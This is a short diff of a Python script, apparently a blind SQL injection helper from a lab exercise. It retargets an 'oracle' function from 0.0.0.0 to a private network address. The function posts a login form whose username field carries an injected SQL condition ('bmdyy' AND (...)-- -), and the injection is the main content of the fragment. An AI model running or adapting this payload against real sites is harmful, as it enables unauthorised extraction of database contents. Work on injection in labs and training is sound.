@@ -25,7 +25,7 @@ C_YELLOW = "\x1b[38;5;3m"
 
 def oracle(q):
     r = requests.post(
-        "http://0.0.0.0/index.php",
+        "http://192.168.0.185/index.php",
         headers={"Content-Type": "application/x-www-form-urlencoded"},
         data="username=" + quote_plus("bmdyy' AND (" + q + ")-- -")
     )
